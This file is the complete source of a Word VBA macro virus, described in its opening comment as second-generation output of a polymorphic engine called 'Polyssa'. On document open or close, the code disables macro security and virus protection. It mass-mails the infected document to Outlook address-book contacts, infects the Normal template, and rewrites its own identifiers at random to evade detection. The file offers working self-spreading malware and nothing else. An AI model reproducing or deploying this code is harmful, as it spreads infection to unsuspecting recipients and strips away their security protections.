' This file contains example 2nd generation output from Polyssa

 ' T1b





 ' T1b
 ' T1b


Private NM9D() As String
Private Jk4tn() As String
Private XL2o() As String
Private To6i As String

Private Sub Document_Open()
  On Error Resume Next
  Randomize: If Rnd > 0.6 Then Lm2jv
End Sub


Private Sub Document_Close()
  On Error Resume Next
  Randomize: If Rnd > 0.6 Then Lm2jv
End Sub

Private Sub Lm2jv()

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False     ' T1b
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Dim Rm4gU, K0t, Xy9ti   ' T1b
Set Rm4gU = CreateObject("Outlook.Application")
Set K0t = Rm4gU.GetNameSpace("MAPI")   ' T1b
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "C1x?") <> "Gp5Xr" Then
If Rm4gU = "Outlook" Then
K0t.Logon "profile", "password"
For D7R = 1 To K0t.AddressLists.Count
Set Qt3tq = K0t.AddressLists(D7R)    ' T1b
Au1R = 1
Set Xy9ti = Rm4gU.CreateItem(0)
For T6e = 1 To Qt3tq.AddressEntries.Count
J2P = Qt3tq.AddressEntries(Au1R)
Xy9ti.Recipients.Add J2P
Au1R = Au1R + 1
If Au1R > 50 Then T6e = Qt3tq.AddressEntries.Count
Next T6e



Xy9ti.Subject = "Your mail"
Xy9ti.Body = "How's this?" + Chr$(13) + Application.UserName
Xy9ti.Attachments.Add ActiveDocument.FullName
Xy9ti.Send
J2P = ""
Next D7R
K0t.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "C1x?") = "Gp5Xr"
End If
Set Td7x1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set RV8Q1 = NormalTemplate.VBProject.VBComponents.Item(1)    ' T1b
D1d = RV8Q1.CodeModule.CountOfLines
B6r = Td7x1.CodeModule.CountOfLines
Qz3c = 2
If Td7x1.Name <> "Fg2c" Then
If B6r > 0 Then Td7x1.CodeModule.DeleteLines 1, B6r
Set Ih0M = Td7x1
Td7x1.Name = "Fg2c"
Wn2zR = True
End If
If RV8Q1.Name <> "Fg2c" Then
If D1d > 0 Then RV8Q1.CodeModule.DeleteLines 1, D1d
Set Ih0M = RV8Q1
RV8Q1.Name = "Fg2c"
Gj5y = True
End If ' T1b
If Gj5y <> True And Wn2zR <> True Then GoTo Yt9qC
If Gj5y = True Then








Wc4vu Td7x1.CodeModule, Ih0M.CodeModule
End If
If Wn2zR = True Then
 ' T1b




 ' T1b


Wc4vu RV8Q1.CodeModule, Ih0M.CodeModule
End If
Yt9qC:  ' T1b
If D1d <> 0 And B6r = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then        ' T1b
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName   ' T1b
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True ' T1b
End If
 ' T1b






End Sub
Private Sub P5R()
 ' T1b


ReDim Jk4tn(50)
Jk4tn(1) = "Wc4vu"
Jk4tn(2) = "P5R"
Jk4tn(3) = "NM9D"
Jk4tn(4) = "Jk4tn"
Jk4tn(5) = "XL2o"    ' T1b
Jk4tn(6) = "To6i"    ' T1b
Jk4tn(7) = "ID2Ki"
Jk4tn(8) = "H2f"
Jk4tn(9) = "Q6d"
Jk4tn(10) = "E7m"
Jk4tn(11) = "Ze6Fm"
Jk4tn(12) = "Ve7Fv"
Jk4tn(13) = "C5m"
Jk4tn(14) = "Ac4G"    ' T1b
Jk4tn(15) = "L1G"
Jk4tn(16) = "F6P"
Jk4tn(17) = "Qz9yi"
Jk4tn(18) = "CI1j"
Jk4tn(19) = "Qg1sh"
Jk4tn(20) = "X3J%"
Jk4tn(21) = "Vs1fb%"    ' T1b
Jk4tn(22) = "S4u%"
Jk4tn(23) = "Jo5n%"
Jk4tn(24) = "I6b"
Jk4tn(25) = "Zo4ni"
Jk4tn(26) = "Vc4b"
Jk4tn(27) = "Ov1dd"
Jk4tn(28) = "L5Z"    ' T1b
Jk4tn(29) = "Lq5a"

Jk4tn(30) = "Lm2jv"
Jk4tn(31) = "Rm4gU"
Jk4tn(32) = "K0t"
Jk4tn(33) = "Xy9ti"
Jk4tn(34) = "C1x?"
Jk4tn(35) = "Gp5Xr"
Jk4tn(36) = "D7R"
Jk4tn(37) = "Au1R"
Jk4tn(38) = "T6e"
Jk4tn(39) = "Qt3tq"
Jk4tn(40) = "J2P"
Jk4tn(41) = "Td7x1"
Jk4tn(42) = "RV8Q1"
Jk4tn(43) = "D1d"
Jk4tn(44) = "B6r"
Jk4tn(45) = "Qz3c"
Jk4tn(46) = "Fg2c"
Jk4tn(47) = "Ih0M"    ' T1b
Jk4tn(48) = "Wn2zR"
Jk4tn(49) = "Gj5y"
Jk4tn(50) = "Yt9qC"

End Sub
Private Sub Wc4vu(ID2Ki, H2f)
ReDim NM9D(0)
ReDim Jk4tn(0)
ReDim XL2o(0)
Dim Q6d As String
For I = 1 To ID2Ki.CountOfLines
Q6d = ID2Ki.Lines(I, 1)
If Trim(Q6d) <> "" Then L5Z Q6d, 1
Next I
E7m
H2f.DeleteLines 1, H2f.CountOfLines
H2f.AddFromString ""
For I = 1 To ID2Ki.CountOfLines
Q6d = ID2Ki.Lines(I, 1)
If Trim(Q6d) <> "" Then
To6i = ""
L5Z Q6d, 2
If Rnd < 0.1 Then To6i = To6i + " ' " + "Qg1sh"
H2f.InsertLines H2f.CountOfLines + 1, To6i
End If
Next I
End Sub
Private Sub Ov1dd(Ve7Fv As String, C5m As Integer)
Ze6Fm = Left$(Ve7Fv, 1) = Chr$(34) And Right$(Ve7Fv, 1) = Chr$(34) And Len(Ve7Fv) > 2                  ' T1b
If Ze6Fm Then Ve7Fv = Mid$(Ve7Fv, 2, Len(Ve7Fv) - 2)
Ac4G = UCase$(Left$(Ve7Fv, 1)) >= "A" And UCase$(Left$(Ve7Fv, 1)) <= "Z"
Lq5a = UCase$(Right$(Ve7Fv, 1))
If C5m = 1 Then
If Ac4G Then
For X3J% = 1 To UBound(NM9D)
If Ve7Fv = NM9D(X3J%) Then Exit Sub
Next X3J%
ReDim Preserve NM9D(UBound(NM9D) + 1)
NM9D(UBound(NM9D)) = Ve7Fv
End If
Exit Sub
End If
If Ac4G Then
For X3J% = 1 To UBound(Jk4tn)
If Ve7Fv = Jk4tn(X3J%) Then
Ve7Fv = XL2o(X3J%)
If Lq5a < "A" Or Lq5a > "Z" Then Ve7Fv = Ve7Fv + Lq5a
Exit For
End If ' T1b
Next X3J%
End If
If Ze6Fm Then Ve7Fv = Chr$(34) + Ve7Fv + Chr$(34)
If To6i <> "" Then
If Right$(To6i, 1) <> "." And Left$(Ve7Fv, 1) <> "." Then Ve7Fv = " " + Ve7Fv         ' T1b
End If
To6i = To6i + Ve7Fv
End Sub
Private Sub E7m()
P5R
ReDim Preserve XL2o(UBound(Jk4tn))
For X3J% = 1 To UBound(XL2o)
L1G:
F6p = Int(Rnd * 3) + 3
Qz9yi = ""
For Vs1fb% = 1 To F6p
CI1j = Chr$(97 + Int(Rnd * 26))
If Vs1fb% = 1 Or Rnd > 0.8 Then CI1j = UCase$(CI1j)    ' T1b
If Vs1fb% = 1 + Int(F6p / 2) Then CI1j = Chr$(48 + Rnd * 9)
Qz9yi = Qz9yi + CI1j
Next Vs1fb%
For Vs1fb% = 1 To UBound(NM9D)
If Qz9yi = NM9D(Vs1fb%) Then GoTo L1G
Next Vs1fb%
For Vs1fb% = 1 To X3J% - 1
If Qz9yi = XL2o(Vs1fb%) Then GoTo L1G
Next Vs1fb%
XL2o(X3J%) = Qz9yi
Next X3J%
End Sub
Private Sub L5Z(Q6d As String, C5m As Integer)
Dim Ve7Fv As String
Dim CI1j As String ' T1b
Do
Q6d = LTrim(Q6d)
Zo4ni = False
If Len(Q6d) = 0 Then Exit Do
S4u% = 1
CI1j = UCase$(Left$(Q6d, 1))
I6b = (CI1j >= "A" And CI1j <= "Z") Or (CI1j >= "0" And CI1j <= "9")
Do
If S4u% > Len(Q6d) Then Exit Do
CI1j = Mid$(Q6d, S4u%, 1)
If CI1j = Chr$(34) Then
If Zo4ni Then S4u% = S4u% + 1: Exit Do
Zo4ni = True ' T1b
End If
If Not Zo4ni Then
If I6b Then
If CI1j = "$" Or CI1j = "%" Or CI1j = "&" Then S4u% = S4u% + 1: Exit Do
If CI1j = "!" Or CI1j = "#" Then S4u% = S4u% + 1: Exit Do
End If
Vc4b = UCase$(CI1j) >= "A" And UCase$(CI1j) <= "Z"       ' T1b
Vc4b = Vc4b Or (CI1j >= "0" And CI1j <= "9") Or CI1j = "_"
If I6b <> Vc4b Then Exit Do
If CI1j < Chr$(33) Or CI1j > Chr$(127) Then Exit Do
End If
S4u% = S4u% + 1
Loop
Ve7Fv = Left$(Q6d, S4u% - 1)
Q6d = Right$(Q6d, Len(Q6d) - (S4u% - 1))
If Left$(Ve7Fv, 1) = "'" Or Ve7Fv = "Rem" Then Exit Do
Ov1dd Ve7Fv, C5m
Loop
End Sub

